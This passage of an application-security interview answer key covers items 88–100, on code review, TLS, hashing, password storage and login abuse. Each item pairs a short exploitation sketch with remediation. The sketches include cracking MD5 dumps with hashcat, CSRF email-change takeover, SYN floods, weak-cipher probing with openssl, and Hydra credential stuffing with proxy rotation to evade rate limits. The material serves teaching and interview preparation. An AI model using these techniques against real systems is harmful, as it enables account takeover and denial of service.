- **Approaches/Variants:** Manual — catches business-logic flaws, authorization gaps, and context-dependent issues automated tools structurally can't reason about. Automated (SAST) — catches known dangerous-pattern classes (injection sinks, crypto misuse) fast and at scale.
- **Why it's asked:** Tests whether you understand these are complementary, not competing.
- **How to structure your answer:** "I'd use both — SAST as a fast, continuous first pass to catch known patterns at scale, then manual review focused specifically on authentication/authorization logic and business rules, which is where I personally find the highest-impact issues that tools miss entirely." For what you look for first: authentication/session handling and anywhere user input crosses a trust boundary.
- **Best-practice takeaway:** Give a real example of a business-logic flaw you found manually that no SAST tool would ever flag (e.g., a discount-stacking or workflow-bypass issue).

### 89. Spot the Bug: MD5 Password Hashing, No Salt
- **What it is:** Storing user passwords using a fast, unsalted, cryptographically broken hash function.
- **Types:** N/A (this is the vulnerable pattern itself) — related broken patterns include unsalted SHA-1/SHA-256 and reversible encryption of passwords.
- **Why it is vulnerable:** MD5 is fast to compute (billions of hashes/second on modern GPUs) and has no salt, making rainbow-table lookups and mass brute-forcing of the entire password database trivial and cheap.
- **How it's exploited / PoC:** Given a leaked MD5 hash database, run it through `hashcat` against a rainbow table or wordlist — the vast majority of common passwords crack in seconds to minutes, and because there's no salt, identical passwords across different users produce identical hashes (revealing password reuse patterns even before cracking).
- **Remediation:** Use a slow, purpose-built password hashing algorithm with built-in per-password salting — bcrypt, scrypt, or Argon2 (Argon2id preferred) — with an appropriately tuned work factor.

### 90. Spot the Bug: State-Changing POST with No CSRF Token
- **What it is:** (Same underlying vulnerability class as Q14, presented as a code-review finding) — an endpoint that changes state (email update) based solely on a POST request with no anti-CSRF protection.
- **Types:** N/A — see Q14 for CSRF variants.
- **Why it is vulnerable:** The endpoint authenticates via cookie alone and performs the action with no verification that the request was intentionally initiated by the user from the legitimate application (no token, no origin check).
- **How it's exploited / PoC:** As in Q14 — an auto-submitting hidden form on an attacker-controlled page, visited by an already-logged-in victim, silently changes their account email to one the attacker controls, setting up an account-takeover via password reset.
- **Remediation:** Add a synchronizer CSRF token validated server-side on every state-changing request, set `SameSite=Lax` (or `Strict`) on the session cookie, and require re-authentication or email confirmation for sensitive changes like email/password updates.

### 91. Managing Vulnerable Third-Party Dependencies (SCA Findings)
`[Adapted format]`
- **What it is:** The process of triaging and remediating vulnerabilities flagged by an SCA tool in open-source/third-party libraries.
- **Approaches/Variants:** Direct upgrade to a patched version (preferred), applying a vendor-provided mitigation/config workaround if no patch exists yet, isolating/sandboxing the vulnerable component if it can't be immediately upgraded, accepting documented residual risk with compensating controls if truly unavoidable short-term.
- **Why it's vulnerable if unmanaged:** Vulnerable dependencies (e.g., Log4Shell-style RCEs) are actively scanned for and exploited by attackers at internet scale within hours of public disclosure — unmanaged dependency risk is one of the fastest-moving threat categories.
- **How it's exploited / PoC:** An attacker scans the internet (or a specific target) for a known-vulnerable version fingerprint (via response headers, error messages, or behavior) of a widely-used library and fires a public proof-of-concept exploit at scale before organizations have patched.
- **Remediation:** Automate SCA scanning in CI/CD with build-breaking thresholds for critical/high findings, maintain an accurate software bill of materials (SBOM), and have an emergency out-of-band patching process for critical zero-day dependency disclosures (don't wait for the normal release cycle).

### 92. Measuring SDL/AppSec Program Effectiveness
`[Adapted format]`
- **What it is:** Metrics used to demonstrate whether an application security program is actually reducing risk over time.
- **Approaches/Variants:** Mean time to remediate (MTTR) by severity, percentage of critical/high findings fixed within SLA, trend of new-vs-recurring vulnerability classes release over release, SAST/DAST/SCA coverage percentage across the app portfolio, percentage of releases that included a threat-modelling review.
- **Why it's asked:** Tests whether you think about AppSec as a program to be measured and improved, not just a series of individual engagements.
- **How to structure your answer:** Pick 3–4 concrete, trackable metrics and explain what each tells leadership (e.g., a falling "recurring vulnerability class" trend proves training/secure-coding-standard adoption is working, not just that scanning caught more bugs).
- **Best-practice takeaway:** Emphasize trend metrics over point-in-time counts — a single scan's finding count says little without a baseline to compare against.

---

## SECTION 9 — HTTP/S, Networking & Cryptography Fundamentals

### 93. What Happens When You Type a URL and Hit Enter
`[Adapted format]`
- **What it is:** The full request lifecycle from browser input to rendered page.
- **Approaches/Variants:** Browser cache check → DNS resolution (recursive resolver → root → TLD → authoritative) → TCP three-way handshake → TLS handshake (if HTTPS) → HTTP request sent → server processes and responds → browser parses HTML/CSS/JS and renders, issuing further sub-requests as needed.
- **Why it's asked:** A classic fundamentals question testing whether you understand the full stack, not just the application layer — flagged explicitly as a real question style used in Big-4/FAANG-adjacent security interviews.
- **How to structure your answer:** Narrate each layer in order, and proactively mention security touchpoints at each step (DNS spoofing/DNSSEC, TCP SYN flood/spoofing, TLS certificate validation and MITM prevention, HTTP security headers).
- **Best-practice takeaway:** Interviewers use this to gauge depth — go beyond "it loads the page" and volunteer the security-relevant detail at each hop unprompted.

### 94. TCP Three-Way Handshake
- **What it is:** The connection-establishment sequence for a reliable TCP session: SYN → SYN-ACK → ACK.
- **Types:** N/A (mechanism) — related attack: SYN flood (an attacker sends many SYNs and never completes the handshake, exhausting the server's half-open connection table).
- **Why it is vulnerable:** The server allocates resources for each half-open connection upon receiving a SYN, before the handshake completes, creating an exploitable resource-exhaustion window.
- **How it's exploited / PoC:** Flood a target with SYN packets from spoofed source IPs (so SYN-ACKs go nowhere and are never ACKed), exhausting the server's connection backlog and denying service to legitimate clients.
- **Remediation:** SYN cookies (stateless handshake tracking), connection-rate limiting/firewalling, and upstream DDoS mitigation services for internet-facing infrastructure.

### 95. How TLS/SSL Secures Data in Transit
- **What it is:** A cryptographic protocol providing confidentiality, integrity, and (via certificates) authenticity for data in transit.
- **Types:** TLS 1.2 (still widely used, requires careful cipher-suite selection), TLS 1.3 (simplified handshake, removes legacy weak ciphers, mandates forward secrecy) — legacy SSLv2/v3 and early TLS versions are deprecated/broken.
- **Why it is vulnerable [where TLS can still fail]:** Weak/legacy cipher suites, missing certificate validation on the client, and misconfigured servers (e.g., accepting SSLv3, vulnerable to POODLE) undermine TLS's guarantees even when "HTTPS" is nominally enabled.
- **How it's exploited / PoC:** Use `testssl.sh`/`sslyze` against a target to identify support for a deprecated protocol version or weak cipher suite (e.g., RC4, export-grade ciphers), then demonstrate a downgrade attack forcing the connection to negotiate the weaker option before intercepting traffic.
- **Remediation:** Enforce TLS 1.2+ only (prefer 1.3), disable weak/legacy cipher suites and protocol versions server-side, enable HSTS to prevent protocol-downgrade attempts, and use certificates from a trusted CA with proper chain validation.

### 96. Weak Cipher Suites
- **What it is:** TLS cipher suite configurations that use outdated, broken, or weak cryptographic algorithms.
- **Types:** Export-grade ciphers (deliberately weakened for old export regulations), RC4 (statistically biased, broken), ciphers lacking forward secrecy (static RSA key exchange — a compromised private key retroactively decrypts all past captured traffic), short key lengths.
- **Why it is vulnerable:** These algorithms have known cryptanalytic weaknesses or lack properties (like forward secrecy) that limit the blast radius of a future key compromise.
- **How it's exploited / PoC:** Run `openssl s_client -connect target:443 -cipher RC4-SHA` or use `testssl.sh --each-cipher target` to enumerate exactly which weak suites the server still accepts, then reference known attacks (e.g., statistical RC4 keystream-bias attacks) applicable to that suite.
- **Remediation:** Configure the server to only offer strong, modern cipher suites (AEAD ciphers like AES-GCM/ChaCha20-Poly1305 with ECDHE key exchange for forward secrecy), and disable everything else explicitly rather than relying on client-side negotiation order alone.

### 97. Encryption vs Hashing vs Salting vs Encoding vs Obfuscation
- **What it is:** Five frequently-confused data-transformation concepts with very different security properties.
- **Types:** Encryption (reversible with the correct key — for confidentiality of data you need to get back), Hashing (one-way, fixed-output, for integrity/verification, not meant to be reversed), Salting (random per-input data added before hashing to defeat rainbow tables/precomputation), Encoding (reversible format transformation with no secret involved — e.g., Base64 — provides zero confidentiality), Obfuscation (making something harder to read/reverse-engineer without a formal cryptographic guarantee — e.g., minified/renamed code).
- **Why it is vulnerable [common mistake]:** Treating encoding (Base64) as if it provides security is a very common junior mistake — it's trivially reversible by anyone with no secret required at all.
- **How it's exploited / PoC:** Find an application "protecting" a sensitive parameter by Base64-encoding it in a URL or cookie; simply `base64 -d` it to reveal the plaintext value with no cracking or key needed whatsoever.
- **Remediation:** Use encryption only when the plaintext must be recoverable (with proper key management); use salted, slow hashing for passwords (never plain hashing, never encoding); never present encoding or obfuscation as a security control.

### 98. Why HTTPS Sites Still Get Hacked
`[Adapted format]`
- **What it is:** TLS/HTTPS secures data *in transit* between client and server — it says nothing about the security of the application logic, server configuration, or data at rest.
- **Approaches/Variants:** Application-layer vulnerabilities (SQLi, XSS, BOLA — Sections 2 & 4) are completely unaffected by the presence of HTTPS, since the attacker's malicious payload is simply carried *inside* the encrypted channel rather than being blocked by it.
- **Why it's asked:** Tests whether you understand what TLS actually guarantees, versus the common misconception that "HTTPS = secure site."
- **How to structure your answer:** "HTTPS protects the pipe, not what flows through it or what's stored at the other end" — give a concrete example, e.g., a site with perfect TLS configuration that's still trivially SQL-injectable because the vulnerability is in the application code, not the transport layer.
- **Best-practice takeaway:** Use this to segue into why full-stack testing (network, transport, application, business logic) is necessary — no single control covers the whole attack surface.

### 99. Designing a Secure Password Storage & Reset Mechanism
- **What it is:** End-to-end secure handling of password creation, storage, and recovery.
- **Types:** Storage — modern adaptive hashing (Argon2id/bcrypt/scrypt) with unique per-user salt and a tuned work factor. Reset — time-limited, single-use, cryptographically random reset tokens (not predictable IDs), sent only to a verified out-of-band channel.
- **Why it is vulnerable if done poorly:** Fast/unsalted hashing enables mass cracking (Q89); predictable or long-lived reset tokens enable account takeover via token guessing or reuse; revealing "email not found" vs "invalid password" on login/reset enables user enumeration.
- **How it's exploited / PoC:** A reset-token scheme using a sequential/timestamp-derived token lets an attacker predict or brute-force a valid token for a target's email within the token's active window, resetting the victim's password without ever accessing their inbox.
- **Remediation:** Argon2id/bcrypt with unique salts and a work factor tuned to current hardware; cryptographically random, sufficiently long, single-use, short-expiry reset tokens invalidated immediately after use; generic "if this account exists, a reset link was sent" messaging to prevent enumeration; rate-limit reset requests per account/IP.

### 100. Defending Login/Signup/Forgot-Password Flows Against Brute Force & Credential Stuffing
- **What it is:** Layered protections against automated password-guessing and reuse of breached credential lists against your login.
- **Types:** Traditional brute force (guessing passwords for one account), credential stuffing (trying breached username/password pairs across many accounts), password spraying (trying one common password across many accounts to avoid single-account lockout thresholds).
- **Why it is vulnerable if unprotected:** Unthrottled login/forgot-password endpoints let automated tools attempt millions of combinations, and password reuse across sites means a breach elsewhere becomes a login success here.
- **How it's exploited / PoC:** Use a tool like Hydra or a custom script with a breached-credential list against the login endpoint, spacing requests just under any per-IP threshold, or rotating through a large proxy pool to bypass IP-based rate limiting entirely, until valid credential pairs are found.
- **Remediation:** CAPTCHA after a small number of failed attempts, per-account and per-IP rate limiting (tuned to catch spraying, not just single-account brute force), account lockout/step-up-auth after repeated failures, mandatory MFA, and proactive monitoring against known-breached-credential databases (alerting/forcing reset when a user's credentials appear in a breach feed).

---

*End of answer key. Pair this with the question list (PwC_AppSec_VAPT_Interview_Questions.md) — practice saying each answer out loud in under 90 seconds; that's roughly the time a live technical-round follow-up allows before the interviewer moves on.*
